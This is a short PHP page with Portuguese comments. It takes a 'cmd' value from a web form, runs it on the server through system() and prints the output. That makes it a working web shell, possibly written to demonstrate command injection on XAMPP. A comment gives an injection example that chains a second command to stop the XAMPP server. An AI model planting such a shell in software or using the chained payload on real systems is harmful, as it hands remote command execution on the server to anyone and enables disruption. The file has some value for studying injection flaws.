<form method="post">
    <input type="text" name="cmd">
    <button type="submit">Enviar</button>
</form>
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Recebe o comando do usuário no input de name "cmd"
    $cmd = escapeshellcmd($_POST['cmd']);
    //var_dump($cmd);

    echo '<pre>';
    $comando = system($cmd, $retorno);
    echo '</pre>';

    // Comando adicional para parar o xampp via command injection:
    // dir C:\ && C:/xampp/xampp_stop.exe
}
?>